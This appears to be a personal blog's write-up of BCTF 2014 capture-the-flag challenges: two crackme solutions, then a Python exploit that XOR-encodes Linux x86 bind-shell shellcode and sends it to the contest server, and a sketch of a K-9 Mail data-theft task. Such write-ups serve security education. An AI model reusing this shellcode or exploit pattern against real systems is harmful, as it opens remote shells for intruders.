@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>BCTF百度杯网络安全大赛部分 write_up</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>BCTF百度杯网络安全大赛部分 write_up</h2>
+	<p class="meta">2014-03-12</p>
+
+	<div class="post">
+	        <p></p>
+<p><span style="color: rgb(38, 38, 38);"><strong>BCTF“百度杯”全国网络安全技术对抗赛,是由百度公司主办,清华和北大的安全技术专家提供技术支持,紫金江宁、南京赛宁承办,面向全国范围网络安全技术实战竞赛!</strong></span></p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>0×01 最难的题目: 100</strong></span></p>
+<p style="text-align:center"><img data-original="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="1.jpg"></p>
+<noscript><img src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="1.jpg"></noscript>
+<p>下载后，发现时exe文件，od加载，经调试发现有反调试</p>
+<p style="text-align:center"><img data-original="/imgs/c1a9f0083c67cc9edc9b00c2a2b297fe.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="2.jpg"></p>
+<noscript><img src="/imgs/c1a9f0083c67cc9edc9b00c2a2b297fe.jpg!small" title="2.jpg"></noscript>
+<p style="text-align:center"><img data-original="/imgs/bf826446e44ebb63b23016f116a40ab7.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="3.jpg"></p>
+<noscript><img src="/imgs/bf826446e44ebb63b23016f116a40ab7.jpg!small" title="3.jpg"></noscript>
+<p>设置，直接上StrongOD，这下反调试就跳过了，然后发现运行中不停的弹框</p>
+<p style="text-align:center"><img data-original="/imgs/6cf8508368b83ad1e42aeccdb2701e7e.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="4.jpg"></p>
+<noscript><img src="/imgs/6cf8508368b83ad1e42aeccdb2701e7e.jpg!small" title="4.jpg"></noscript>
+<p>Nop掉这句messageBoxA，然后这个程序就可以顺利跑了。。跑好久后，可以看到</p>
+<p style="text-align:center"><img data-original="/imgs/1fa34d97f3399676c1c3080abc8c15fa.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="5.jpg"></p>
+<noscript><img src="/imgs/1fa34d97f3399676c1c3080abc8c15fa.jpg!small" title="5.jpg"></noscript>
+<p>即，把仅有的字符串拼接，得到这道题的Flag是<span style="color: rgb(38, 38, 38);"><strong>TH3_H4rd3st_H3r3</strong></span></p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>0×02 小菜一碟: 200</strong></span></p>
+<p style="text-align:center"><img data-original="/imgs/24cd79e95927ceddcccce2a43e3cca69.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="5_5.jpg"></p>
+<noscript><img src="/imgs/24cd79e95927ceddcccce2a43e3cca69.jpg!small" title="5_5.jpg"></noscript>
+<p>OD加载，这道题明显就是要输个字符串然后验证正确，定位到输入后的验证地址</p>
+<p style="text-align:center"><img data-original="/imgs/f77a948d8965fce9e6c1a538c3c6ffea.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="6.jpg"></p>
+<noscript><img src="/imgs/f77a948d8965fce9e6c1a538c3c6ffea.jpg!small" title="6.jpg"></noscript>
+<p>这里可以看到要求输入是16位纯数字，而且输入后在内存中，会进行修正，即假设输入为a1-a16，则会在a5和a6中间插入 a5_5=01，a7和a8见插入a7_5=08，以及a10_5=00，a11_5=07</p>
+<p><br></p>
+<p style="text-align:center"><img data-original="/imgs/3d4b567b7fd5e02da07a12eb135313ec.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="7.jpg"></p>
+<noscript><img src="/imgs/3d4b567b7fd5e02da07a12eb135313ec.jpg!small" title="7.jpg"></noscript>
+<p>下来就是提示所指出的这段代码含义：</p>
+<p style="text-align:center"><img data-original="/imgs/d2df6737565d768a1bcef35595723d9f.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="8.jpg"></p>
+<noscript><img src="/imgs/d2df6737565d768a1bcef35595723d9f.jpg!small" title="8.jpg"></noscript>
+<p>看似是乘了0×66666667</p>
+<p>实质这段代码是edx/10，后面这段代码反复会被用到，</p>
+<p><br></p>
+<p style="text-align:center"><img data-original="/imgs/e4f96ddd1e9507895922dd5935bdb1c1.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="9.jpg"></p>
+<noscript><img src="/imgs/e4f96ddd1e9507895922dd5935bdb1c1.jpg!small" title="9.jpg"></noscript>
+<p>这大段循环中，实际运行了两次，一共对密码进行了这些验证</p>
+<p>之前就验证了a1!=0</p>
+<pre class="prettyprint lang-html"> t1=(a6*a7)%10
+ t2=(a6*a7_5)%10
+ (a5_5*a7+(a6*a7)/10)%10==a1
+(a2-t1)==(a5_5*a7_5+(a6*a7_5)/10)%10
+a2&gt;t1
+a3&gt;t2
+(a5_5*a7+(a6*a7)/10)/10==0
+0==(a5_5*a7_5+(x6*a7_5)/10)/10
+a2!=t1
+a3!=t2
+a3-t2&lt;=a5_5
+a4&lt;a6:</pre>
+<p>一共这么多条规则，是不是震惊了。别急还没完，好不容易来到了这里</p>
+<p style="text-align:center"><img data-original="/imgs/d5a621ddf2699aa5bd72b418cd04bbd3.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="10.jpg"></p>
+<noscript><img src="/imgs/d5a621ddf2699aa5bd72b418cd04bbd3.jpg!small" title="10.jpg"></noscript>
+<p>你会发现这个call013d1000，进去后又是无尽的加加除除的，然后返回后，你需要通过这四个jnz才能继续向下，这个call和这四个jnz的具体对应是：</p>
+<pre class="prettyprint lang-html">t2=(a6*a9)%10
+t4=(a9+a6*a9/10)/10
+t5=a6*a8
+t3=a5_5*a9+(a6*a9)/10
+t7=a8+a6*a8/10
+t8=t5%10
+t9=t3%10
+t11=t7%10+(t8+t9)/10
+((t4+t11)/10+t7/10)==0
+(a3-(a6*a7_5)%10)==(t4+t11)%10
+a4==(t8+t9)%10:
+a5==t2</pre>
+<p>震惊了吧。。。。</p>
+<p>别急，这里才刚刚验证了输入的a1-a9，还剩a10-a16呢，不过最后这几位简单了，直接内存中与已有的字符串进行了对比，即最后一段的循环。</p>
+<p>附下，这么多的变量靠脑子想有点难，所以写了个程序自己跑了：</p>
+<pre class="prettyprint lang-python">'''
+Created on 2014-3-9
+    print (a5_5*x7+(x6*x7)/10)%10==x1
+    print (x2-t1)==(a5_5*a7_5+(x6*a7_5)/10)%10
+    print x2&gt;t1
+    print x3&gt;t2
+    print (a5_5*x7+(x6*x7)/10)/10==0
+    print 0==(a5_5*a7_5+(x6*a7_5)/10)/10
+    print  x3-t2&lt;=a5_5
+@author: icefish
+'''
+#answer:6970825096996108
+a5_5=1
+
+a7_5=8
+def checkFirst(x1,x2,x3,x4,x6,x7):
+    t1=(x6*x7)%10
+    t2=(x6*a7_5)%10
+
+    if x1!=0 and (a5_5*x7+(x6*x7)/10)%10==x1 and (x2-t1)==(a5_5*a7_5+(x6*a7_5)/10)%10 and x2&gt;t1 and x3&gt;t2 and (a5_5*x7+(x6*x7)/10)/10==0 and 0==(a5_5*a7_5+(x6*a7_5)/10)/10 and x2!=t1 and x3!=t2 and x3-t2&lt;=a5_5 and x4&lt;x6:
+        if check(x3-t2,x4,x6):
+            #print x1,x2,x3,x4,x6,x7
+            print 'a1='+str(x1),'a2='+str(x2),'a3='+str(x3),'a4='+str(x4),'a6='+str(x6),'a7='+str(x7)
+
+    
+def check(a1_x,a4,a6):
+    for a8 in range(10):
+        for a9 in range(10):
+            t2=(a6*a9)%10
+            t4=(a9+a6*a9/10)/10
+            t5=a6*a8
+            t3=a5_5*a9+(a6*a9)/10
+            t7=a8+a6*a8/10
+            t8=t5%10
+            t9=t3%10
+            t11=t7%10+(t8+t9)/10
+            if ((t4+t11)/10+t7/10)==0 and a1_x==(t4+t11)%10 and a4==(t8+t9)%10:
+                print 'a8='+str(a8),'a9='+str(a9)
+                print 'a5='+str(t2)
+                return True
+if __name__ == '__main__':
+    print 'start:'
+    
+    #checkFirst(6,9,7,1,2,5)
+    
+    for i in range(10):
+        for j1 in range(10):
+            for j2 in range(10):
+                for j3 in range(10):
+                    for j4 in range(10):
+                        for j5 in range(10):
+                            checkFirst(i,j1,j2,j3,j4,j5)</pre>
+<p><br></p>
+<p>得到a8=0, a9=9, a5=8, a1=6,a2=9, a3=7,a4=0, a6=2 , a7=5</p>
+<p>总的输入为：6970825096996108</p>
+<p style="text-align:center"><img data-original="/imgs/cb1e5d50992f1a24ca6b367e73adb7c0.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="11.jpg"></p>
+<noscript><img src="/imgs/cb1e5d50992f1a24ca6b367e73adb7c0.jpg!small" title="11.jpg"></noscript>
+<p><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>0×03 后门程序: 100</strong></span></p>
+<p>   这个程序是个linux的，比较讨厌，题目本身不算复杂，edb调试和ida都可以很快的分析出来，这是个输入后溢出的题目</p>
+<p style="text-align:center"><img data-original="/imgs/13a41a5d58618a2e92bc1274e736ddc8.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="12.jpg"></p>
+<noscript><img src="/imgs/13a41a5d58618a2e92bc1274e736ddc8.jpg!small" title="12.jpg"></noscript>
+<p>然后很快定位到replay的输入检查</p>
+<p style="text-align:center"><img data-original="/imgs/d79bb132ed035bd3ffdc34eacc4dab03.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="13.jpg"></p>
+<noscript><img src="/imgs/d79bb132ed035bd3ffdc34eacc4dab03.jpg!small" title="13.jpg"></noscript>
+<p>这里实际把输入和固定字符串&lt;baidu-rocks,froM-china-with-love&gt;进行了异或，如果输入长度大于固定字符串，超过部分循环再开始和固定字符串异或</p>
+<p style="text-align:center"><img data-original="/imgs/2fac562b260f3db7a4e1074096bc9992.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="14.jpg"></p>
+<noscript><img src="/imgs/2fac562b260f3db7a4e1074096bc9992.jpg!small" title="14.jpg"></noscript>
+<p>异或结果前十个字节与后门字符串n0b4ckd00r比较</p>
+<p><br></p>
+<p style="text-align:center"><img data-original="/imgs/1f56cbe65d9fb0a6db961470a66d0feb.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="15.jpg"></p>
+<noscript><img src="/imgs/1f56cbe65d9fb0a6db961470a66d0feb.jpg!small" title="15.jpg"></noscript>
+<p>然后相等就进入了后门利用阶段，从输入异或后的第十个字节开始，call eax，进入了shellcode</p>
+<p style="text-align:center"><img data-original="/imgs/339f5f9607ee9193066fdcb6da49013e.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="16.jpg"></p>
+<noscript><img src="/imgs/339f5f9607ee9193066fdcb6da49013e.jpg!small" title="16.jpg"></noscript>
+<p>这里问题在于，直到最后我的shellcode也没能成功运行，不知何故。。</p>
+<p style="text-align:center"><img data-original="/imgs/b2ad97025049795fb5e4737c32895f84.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="17.jpg"></p>
+<noscript><img src="/imgs/b2ad97025049795fb5e4737c32895f84.jpg!small" title="17.jpg"></noscript>
+<p>附上代码：</p>
+<pre class="prettyprint lang-python">'''
+Created on 2014-3-9
+
+@author: icefish
+'''
+
+#! /usr/bin/env python
+#coding=utf-8
+import socket
+import time
+from socket import *
+import os,sys
+import re 
+from time import sleep    
+
+
+ip=""
+port=""
+    
+def nc(str):
+    
+     
+    
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect((ip, port))
+    for i in range(200):
+        data = s.recv(1000)
+        print data
+        if data.find('Replay')!=-1:
+            break
+    sleep(5)
+    s.send(str)
+    s.send('\n')
+    sleep(5)
+    
+    print 'send:'+str
+    #for i in range(10):
+        #data = s.recv(1000)
+       # print data
+        
+def XORtools(str):
+    strkey='&lt;baidu-rocks,froM-china-with-love&gt;'
+    l=len(strkey) 
+    strEncry=''
+    for i in range(len(str)):
+        strEncry+=chr(ord(str[i])^ord(strkey[i%l]))
+    return strEncry
+import struct    
+if __name__=='__main__':
+    ip="218.2.197.249"
+    port=1337
+    #fuzzle(0x250,0x262)
+    str='\x52\x52\x03\x5d\x07\x1e\x49\x42\x5f\x11\x63\x77\xa7\xe8'
+    strPass='n0b4ckd00r'
+    strNop='\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+    buf =  "\x81\xEC\x00\x02\x00\x00"
+    buf += "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x06\x31\xc0\xb0\x01"
+    buf += "\xcd\x80\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1"
+    buf += "\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x0b\xab\x6a"
+    buf += "\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04"
+    buf += "\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59"
+    buf += "\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68"
+    buf += "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b"
+    buf += "\xcd\x80"
+    Encry=XORtools(strPass+strNop+buf)
+    for i in range(len(Encry)):
+        print hex((ord(Encry[i])))
+    file=open('houmen100.txt','w')
+    file.write(Encry)
+    file.close()
+    nc(Encry)</pre>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>0×04 窃密木马: 300</strong></span></p>
+<p>这个基本上都是代码活，</p>
+<p style="text-align:center"><img data-original="/imgs/1f704960a0ef9f1bd3c94161aa9e8eec.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="18.jpg"></p>
+<noscript><img src="/imgs/1f704960a0ef9f1bd3c94161aa9e8eec.jpg!small" title="18.jpg"></noscript>
+<p>首先队伍有人通过google发现漏洞提示：</p>
+<p><a href="http://blog.trustgo.com/k-9-mail-client-is-vulnerable-to-privacy-leak/#sthash.4ln86BHK.dpuf.com" target="_blank" title="" data_ue_src="http://blog.trustgo.com/k-9-mail-client-is-vulnerable-to-privacy-leak/#sthash.4ln86BHK.dpuf.com" textvalue="http://blog.trustgo.com/k-9-mail-client-is-vulnerable-to-privacy-leak/#sthash.4ln86BHK.dpuf.com">http://blog.trustgo.com/k-9-mail-client-is-vulnerable-to-privacy-leak/#sthash.4ln86BHK.dpuf.com</a>其次找到漏洞所在版本k9mail 4.005下载：</p>
+<p><a href="http://k9mail.googlecode.com/files/k9-4.005-release.apk" target="_blank" title="" data_ue_src="http://k9mail.googlecode.com/files/k9-4.005-release.apk" textvalue="http://k9mail.googlecode.com/files/k9-4.005-release.apk">http://k9mail.googlecode.com/files/k9-4.005-release.apk</a></p>
+<p>apktools，dex2jar解包得到AndroidMenifest.xml，发现了的确有这个问题</p>
+<p style="text-align:center"><img data-original="/imgs/fc9b5c53bd8cd37565212a5aa076ac4f.jpg!small" src="/imgs/26b1208a565e935a188b27cbd9ad06e5.jpg!small" title="19.jpg"></p>
+<noscript><img src="/imgs/fc9b5c53bd8cd37565212a5aa076ac4f.jpg!small" title="19.jpg"></noscript>
+<p>下来就是纯粹的代码工作了，由于太长了，我把它放到了自己的Blog上了 <a href="http://icefishwp.sinaapp.com/" target="_blank" title="" data_ue_src="http://icefishwp.sinaapp.com/" textvalue="http://icefishwp.sinaapp.com/">http://icefishwp.sinaapp.com/</a>，感兴趣的可以看看。</p>
+<p>不过这里好不容易本地写好，偷取成功，结果服务器上有av test，改掉了所有的字符串处理依然无法通过，由于时间太晚了，只能放弃了</p>
+<p>0×05  感谢自己的队友，这次大家都很努力。ps 队伍：<strong><span style="color: rgb(38, 38, 38);">A4210B。</span></strong></p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
